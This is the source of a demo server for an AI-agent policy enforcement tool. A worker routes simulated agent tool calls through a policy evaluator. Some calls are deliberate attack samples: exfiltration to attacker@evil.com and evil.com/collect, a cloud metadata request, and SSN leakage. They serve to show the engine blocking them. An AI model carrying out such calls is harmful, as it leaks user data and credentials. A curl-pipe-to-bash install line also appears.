// Demo server — runs without Firebase using local JSON store
// Start with: npm run demo

import Fastify from 'fastify'
import { readFileSync, existsSync } from 'fs'
import { resolve } from 'path'
import { createRequire } from 'module'
import { getDemoDb, seedDemo } from './lib/demo-store.js'
import { log } from './lib/logger.js'
import { sign, verify } from './lib/jwt.js'
import { generateId } from './lib/crypto.js'

// Load the real evaluator from the agent system
const require = createRequire(import.meta.url)
const { evaluateIntent } = require('../netlify/functions/src/engine/evaluator.js')

const db = getDemoDb()
const app = Fastify({ logger: false })

// Seed demo data on first run
seedDemo(db)

// Request ID middleware
app.addHook('onRequest', async (request: any) => {
  request.requestId = generateId('req_', 8)
})

// CORS
app.addHook('onRequest', async (_req: any, reply: any) => {
  reply.header('Access-Control-Allow-Origin', '*')
  reply.header('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE, OPTIONS')
  reply.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Agent-Key')
  if (_req.method === 'OPTIONS') { reply.code(204).send(); return }
})

// Auth — simple email check for demo
async function requireAuth(request: any, reply: any): Promise<any> {
  const header = (request.headers.authorization || '') as string
  const token = header.startsWith('Bearer ') ? header.substring(7) : null
  if (!token) { reply.code(401).send({ error: { code: 'unauthorized', message: 'missing token' } }); return null }
  const claims = verify(token)
  if (!claims) { reply.code(401).send({ error: { code: 'unauthorized', message: 'invalid token' } }); return null }
  return claims
}

function err(reply: any, code: number, cat: string, msg: string) {
  reply.code(code); return { error: { code: cat, message: msg } }
}

// POST /auth/login
app.post('/auth/login', async (req: any, reply: any) => {
  const { email, password } = (req.body || {}) as any
  if (!email || !password) return err(reply, 400, 'validation', 'email and password required')
  const snap = await db.collection('users').doc(email).get()
  if (!snap.exists || (snap.data() as any).password !== password) return err(reply, 401, 'unauthorized', 'invalid credentials')
  const token = sign({ sub: email, role: 'org_admin' })
  return { token, user: { email, role: 'org_admin' } }
})

// POST /task
app.post('/task', async (req: any, reply: any) => {
  if (!(await requireAuth(req, reply))) return
  const { payload } = (req.body || {}) as any
  if (!payload) return err(reply, 400, 'validation', 'payload required')
  const ref = db.collection('tasks').doc()
  await ref.set({ payload, status: 'pending', createdAt: new Date().toISOString(), orgId: 'demo_org' })
  // Log the creation event
  await db.collection('logs').doc(`log_${ref.id}_create`).set({
    taskId: ref.id, tool: 'task.created', decision: 'allow', reason: 'task submitted to queue',
    timestamp: new Date().toISOString(),
  })
  return { id: ref.id, payload, status: 'pending' }
})

// GET /task/:id
app.get('/task/:id', async (req: any, reply: any) => {
  const snap = await db.collection('tasks').doc(req.params.id).get()
  if (!snap.exists) return err(reply, 404, 'not_found', 'task not found')
  return { id: snap.id, ...snap.data() }
})

// GET /agents
app.get('/agents', async () => {
  const snap = await db.collection('agents').get()
  return { data: snap.docs.filter(d => d.exists).map(d => ({ id: d.id, ...d.data() })) }
})

// GET /metrics
app.get('/metrics', async () => {
  const tasks = await db.collection('tasks').get()
  const agents = await db.collection('agents').get()
  const td = tasks.docs.map(d => d.data())
  return {
    tasks: { total: td.length, pending: td.filter((t: any) => t.status === 'pending').length, active: td.filter((t: any) => t.status === 'running').length, completed: td.filter((t: any) => t.status === 'completed').length, failed: td.filter((t: any) => t.status === 'failed').length },
    runs: { active: 0 }, agents: { active: agents.docs.filter(d => d.exists && (d.data() as any).status === 'active').length }, avgDurationMs: 0,
  }
})

// GET /diagnostics
app.get('/diagnostics', async () => ({
  status: 'healthy', mode: 'demo', firestore: { connected: false, usingLocalStore: true },
  config: { environment: 'demo', jwtConfigured: true }, checkedAt: new Date().toISOString(),
}))

// GET /audit/timeline
app.get('/audit/timeline', async () => {
  const snap = await db.collection('logs').get()
  const logs = snap.docs.filter(d => d.exists).map(d => ({ id: d.id, ...d.data() as any }))
  logs.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime())
  return { timeline: logs }
})

// GET /security/ping
app.get('/security/ping', async (req: any) => {
  const claims = verify((req.headers.authorization || '').replace('Bearer ', ''))
  return { authenticated: !!claims, mode: 'demo' }
})

// POST /orgs — create organization
app.post('/orgs', async (req: any, reply: any) => {
  if (!(await requireAuth(req, reply))) return
  const { name, email } = (req.body || {}) as any
  if (!name || !email) return err(reply, 400, 'validation', 'name and email required')
  const id = 'org_' + Date.now().toString(36)
  const now = new Date().toISOString()
  await db.collection('orgs').doc(id).set({ id, name, email, plan: 'free', createdAt: now })
  await db.collection('agents').doc('agent_' + id).set({ id: 'agent_' + id, name: name + ' Bot', model: 'gpt-4o', provider: 'openai', orgId: id, status: 'active', registeredAt: now, capabilities: ['task:execute'] })
  return { id, name, email, agentId: 'agent_' + id }
})

// GET /orgs — list orgs
app.get('/orgs', async () => {
  const snap = await db.collection('orgs').get()
  return { data: snap.docs.filter(d => d.exists).map(d => ({ id: d.id, ...d.data() })) }
})

// POST /agents/register — register agent (demo)
app.post('/agents/register', async (req: any, reply: any) => {
  if (!(await requireAuth(req, reply))) return
  const { name, model, provider } = (req.body || {}) as any
  if (!name || !model || !provider) return err(reply, 400, 'validation', 'name, model, provider required')
  const id = 'agent_' + Date.now().toString(36)
  const pn = 'PP-' + Math.random().toString(16).substring(2, 6).toUpperCase() + '-' + Math.random().toString(16).substring(2, 6).toUpperCase()
  await db.collection('agents').doc(id).set({ id, name, model, provider, orgId: 'demo_org', status: 'active', passport: { passportNumber: pn, systemPromptHash: 'sha256:demo' }, registeredAt: new Date().toISOString(), capabilities: ['task:execute', 'network:http'] })
  return { agentId: id, passportNumber: pn, secretKey: 'ak_live_demo_' + id, secretKeyPrefix: 'ak_live_demo' }
})

// POST /policies — create policy (demo)
app.post('/policies', async (req: any, reply: any) => {
  if (!(await requireAuth(req, reply))) return
  const body = (req.body || {}) as any
  if (!body.name || !body.rules) return err(reply, 400, 'validation', 'name and rules required')
  const id = 'pol_' + Date.now().toString(36)
  await db.collection('policies').doc(id).set({ id, name: body.name, orgId: 'demo_org', status: 'active', priority: body.priority || 10, scope: body.scope || { agentId: '*', environment: ['*'] }, rules: body.rules, createdAt: new Date().toISOString(), updatedAt: new Date().toISOString() })
  return { id, name: body.name }
})

// GET /report — operational report
app.get('/report', async () => {
  const tasksSnap = await db.collection('tasks').get()
  const tasks = tasksSnap.docs.filter(d => d.exists).map(d => d.data() as any)
  return {
    summary: {
      totalTasks: tasks.length,
      completed: tasks.filter(t => t.status === 'completed').length,
      failed: tasks.filter(t => t.status === 'failed').length,
      pending: tasks.filter(t => t.status === 'pending').length,
    },
  }
})

// GET /health — system health model (HEALTHY / DEGRADED / STALLED)
app.get('/health', async () => {
  const snap = await db.collection('tasks').get()
  const tasks = snap.docs.filter(d => d.exists).map(d => d.data() as any)
  const stuck = tasks.filter(t => t.status === 'running').length
  const failed = tasks.filter(t => t.status === 'failed').length
  const pending = tasks.filter(t => t.status === 'pending').length
  const status = stuck > 0 ? 'DEGRADED' : failed > 5 ? 'DEGRADED' : pending > 20 ? 'STALLED' : 'HEALTHY'
  return { status, summary: status === 'HEALTHY' ? 'All queues clear' : `${stuck} stuck, ${failed} failed, ${pending} pending`, indicators: { stuckTasks: stuck, failedTasks: failed, pendingTasks: pending } }
})

// GET /explain/:id — execution explainability (WHY decisions happened)
app.get('/explain/:id', async (req: any, reply: any) => {
  const id = req.params.id
  // Find logs for this intent/run/task
  const snap = await db.collection('logs').get()
  const relatedLogs = snap.docs
    .filter(d => d.exists)
    .map(d => ({ id: d.id, ...d.data() } as any))
    .filter(l => l.intentId === id || l.runId === id || l.taskId === id)
    .sort((a, b) => new Date(a.timestamp).getTime() - new Date(b.timestamp).getTime())

  if (relatedLogs.length === 0) {
    return {
      id,
      explainable: false,
      message: 'No execution logs found for this ID. Execute a task first to generate logs.',
      help: 'POST /task → POST /agent/run → POST /run/:id/log → GET /explain/:id',
    }
  }

  return {
    id,
    explainable: true,
    executionPath: relatedLogs.map((l, i) => ({
      step: i + 1,
      timestamp: l.timestamp,
      tool: l.tool,
      decision: l.decision,
      reason: l.reason || '(system transition)',
      decisionPath: l.decision === 'allow'
        ? '→ policy matched → constraints passed → domain allowed → permit'
        : l.decision === 'deny'
          ? `→ policy violated → ${l.reason || 'rule triggered'} → block`
          : '→ policy matched → parameter modified → permit with changes',
    })),
    summary: {
      totalSteps: relatedLogs.length,
      allowed: relatedLogs.filter(l => l.decision === 'allow').length,
      denied: relatedLogs.filter(l => l.decision === 'deny').length,
      modified: relatedLogs.filter(l => l.decision === 'modify').length,
      finalOutcome: relatedLogs[relatedLogs.length - 1]?.decision || 'unknown',
    },
  }
})
app.get('/', async (_req: any, reply: any) => {
  reply.header('Content-Type', 'text/html')
  return renderDashboard()
})

// Serve static HTML files
app.get('/*', async (request: any, reply: any) => {
  const url = (request.url || '/').split('?')[0]
  const staticFiles = ['index.html', 'landing.html', 'operator.html', 'admin-portal.html',
    'agents.html', 'dev-dashboard.html', 'verify-demo.html', 'sdk-demo.html',
    'tutorial.html', 'tui-tutorial.html']
  if (staticFiles.includes(url.substring(1))) {
    try {
      const path = resolve(process.cwd(), url.substring(1))
      if (existsSync(path)) {
        reply.header('Content-Type', 'text/html')
        return readFileSync(path, 'utf-8')
      }
    } catch {}
  }
  reply.code(404).send({ error: { code: 'not_found', message: 'Route not found' } })
})

// Start
// ---------------------------------------------------------------------------
// Demo worker — processes pending tasks and generates execution events
// ---------------------------------------------------------------------------
async function demoWorker() {
  try {
    const snap = await db.collection('tasks').get()
    const pending = snap.docs.filter(d => d.exists).map(d => ({ id: d.id, ...d.data() as any })).filter(t => t.status === 'pending')
    if (pending.length === 0) return
    const task = pending[0]; const now = new Date().toISOString()
    await db.collection('tasks').doc(task.id).update({ status: 'running', startedAt: now })
    const runId = `run_${Date.now().toString(36)}`
    await db.collection('runs').doc(runId).set({ id: runId, agentId: 'agent_demo', taskId: task.id, status: 'running', startedAt: now, sessionId: `sess_${runId}`, totalActions: 0, allowedActions: 0, deniedActions: 0 })

    // Get the demo policy for real evaluation
    const policySnap = await db.collection('policies').doc('policy_demo').get()
    const policy = policySnap.exists ? { id: policySnap.id, ...policySnap.data() as any } : null
    const policies = policy ? [policy] : []

    // Simulate tool calls through the REAL 11-step evaluator
    const toolCalls = [
      { tool: 'lookup_order', parameters: { orderId: 'ORD-42' } },
      { tool: 'check_inventory', parameters: { sku: 'SKU-8821' } },
      { tool: 'send_email', parameters: { to: 'attacker@evil.com', body: 'exfiltrated data' } },
      { tool: 'http_request', parameters: { url: 'https://evil.com/collect', method: 'POST' } },
      { tool: 'http_request', parameters: { url: 'http://169.254.169.254/latest/meta-data', method: 'GET' } },
      { tool: 'lookup_order', parameters: { orderId: '1', ssn: '123-45-6789' } },
    ]

    for (let i = 0; i < toolCalls.length; i++) {
      await new Promise(r => setTimeout(r, 150))
      const call = toolCalls[i]

      // Evaluate through the real 11-step enforcement engine
      const decision = evaluateIntent({
        intent: { tool: call.tool, parameters: call.parameters },
        agentStatus: 'active',
        policies,
        sessionCost: null, dailyCost: null, toolCost: null,
      })

      await db.collection('logs').doc(`log_${runId}_${i}`).set({
        runId, taskId: task.id, agentId: 'agent_demo',
        tool: call.tool, decision: decision.decision,
        reason: decision.reason || (decision.decision === 'allow' ? 'policy: within allowed tools + domains' : 'policy violation'),
        parameters: call.parameters,
        timestamp: new Date().toISOString(),
      })
    }

    const logSnap = await db.collection('logs').get()
    const runLogs = logSnap.docs.filter(d => d.exists).map(d => d.data() as any).filter(l => l.runId === runId)

    const end = new Date().toISOString()
    await db.collection('runs').doc(runId).update({
      status: 'completed', endedAt: end,
      totalActions: runLogs.length,
      allowedActions: runLogs.filter(l => l.decision === 'allow').length,
      deniedActions: runLogs.filter(l => l.decision === 'deny').length,
    })
    await db.collection('tasks').doc(task.id).update({ status: 'completed', completedAt: end })
  } catch (e: any) {}
}

const PORT = parseInt(process.env.PORT || '3000', 10)
app.listen({ port: PORT }, (e: any) => {
  if (e) { console.error('Start failed:', e.message); process.exit(1) }
  console.log(`\n  ⚡ Demo mode — no Firebase required`)
  console.log(`  → http://localhost:${PORT}`)
  console.log(`  → Terminal TUI:  npm run tui  (in another terminal)`)

  // Start demo worker — processes pending tasks every 3 seconds
  setInterval(demoWorker, 3000)
  demoWorker() // immediate first run
  console.log(`  → Worker: processing tasks automatically\n`)
})

// ---------------------------------------------------------------------------
// Inline dashboard HTML (minimal — links to full pages)
// ---------------------------------------------------------------------------
function renderDashboard() {
  return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Passport Agent</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:system-ui;background:#0d1117;color:#c9d1d9;min-height:100vh}
body::after{content:"";position:fixed;inset:0;background:linear-gradient(to bottom,transparent 50%,rgba(46,160,67,.01) 50%);background-size:100% 4px;pointer-events:none;z-index:9999}
header{background:rgba(13,17,23,.92);backdrop-filter:blur(20px);border-bottom:1px solid rgba(46,160,67,.15);padding:14px 28px}
h1{font-family:"JetBrains Mono",monospace;font-size:14px;font-weight:700;text-transform:uppercase;letter-spacing:3px;color:#2ea043}
main{max-width:700px;margin:0 auto;padding:40px 20px}
.logo{text-align:center;margin-bottom:32px}
.logo h2{font-family:"JetBrains Mono",monospace;font-size:24px;color:#2ea043;text-shadow:0 0 12px rgba(46,160,67,.3)}
.badge{display:inline-block;padding:4px 12px;border:1px solid rgba(46,160,67,.2);border-radius:20px;font-family:"JetBrains Mono",monospace;font-size:10px;color:#2ea043;margin-bottom:16px}
.card{background:rgba(22,27,34,.7);border:1px solid rgba(48,54,61,.5);border-radius:6px;padding:20px;margin-bottom:12px}
.card h3{font-family:"JetBrains Mono",monospace;font-size:11px;text-transform:uppercase;letter-spacing:2px;color:#2ea043;margin-bottom:12px}
.card h3::before{content:"// ";color:#333}
.link-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.link{display:block;padding:10px 14px;background:rgba(46,160,67,.04);border:1px solid rgba(48,54,61,.4);border-radius:4px;font-family:"JetBrains Mono",monospace;font-size:11px;color:#8b949e;text-decoration:none;transition:all .15s}
.link:hover{border-color:rgba(46,160,67,.3);color:#c9d1d9}
.link::before{content:"> ";color:#2ea043}
.endpoint{font-family:"JetBrains Mono",monospace;font-size:11px;color:#8b949e;margin:4px 0}
.method{display:inline-block;width:40px;font-weight:700;font-size:10px}
.g{color:#2ea043}.p{color:#d2991d}.pt{color:#58a6ff}
.install{font-family:"JetBrains Mono",monospace;font-size:11px;padding:12px;background:rgba(0,0,0,.3);border-radius:4px;color:#8b949e;overflow-x:auto}
</style></head><body>
<header><h1>Passport Agent</h1></header>
<main>
<div class="logo"><h2>Passport Agent</h2><div class="badge">⚡ DEMO MODE — no Firebase required</div></div>
<div class="card">
<h3>One-Liner Install (from any terminal)</h3>
<div class="install">curl -fsSL https://raw.githubusercontent.com/jameserez-code/MVP-Netlify-Firebase/main/install.sh | bash</div>
</div>
<div class="card">
<h3>Console Pages</h3>
<div class="link-grid">
<a class="link" href="/operator.html">Operator Console</a>
<a class="link" href="/agents.html">Agent Manager</a>
<a class="link" href="/tutorial.html">Web Tutorial</a>
<a class="link" href="/tui-tutorial.html">TUI Guide</a>
<a class="link" href="/landing.html">Landing Page</a>
<a class="link" href="/admin-portal.html">Admin Portal</a>
<a class="link" href="/dev-dashboard.html">Dev Dashboard</a>
<a class="link" href="/sdk-demo.html">SDK Demo</a>
</div>
</div>
<div class="card"><h3>API Endpoints</h3>
<div class="endpoint"><span class="method p">POST</span> /auth/login</div>
<div class="endpoint"><span class="method p">POST</span> /task</div>
<div class="endpoint"><span class="method g">GET</span> /task/:id</div>
<div class="endpoint"><span class="method g">GET</span> /agents</div>
<div class="endpoint"><span class="method g">GET</span> /metrics</div>
<div class="endpoint"><span class="method g">GET</span> /diagnostics</div>
</div>
</main></body></html>`
}
